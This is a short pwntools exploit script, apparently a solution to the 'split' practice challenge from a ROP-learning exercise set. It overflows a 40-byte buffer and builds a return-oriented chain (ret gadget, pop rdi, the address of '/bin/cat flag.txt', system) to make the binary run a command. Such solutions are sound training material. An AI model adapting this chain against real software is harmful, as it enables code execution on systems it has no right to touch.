import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./split')
io = elf.process()
pwn.gdb.attach(io)
time.sleep(3)
#Addr of /bin/cat flag.txt
stringAddr = 0x601060
#Addr of system
systemAddr = elf.symbols.system 
print(systemAddr)
#Addr of pop rdi gadget
popRDI = 0x4007c3
#ret gadget
retGadget = 0x40053e

io.recv(1000)
offset = 40
payload = b"".join(
    [
        b'A' * offset,
        pwn.p64(retGadget),
        pwn.p64(popRDI),
        pwn.p64(stringAddr),
        pwn.p64(systemAddr)
    ]
)

io.sendline(payload)
io.interactive()
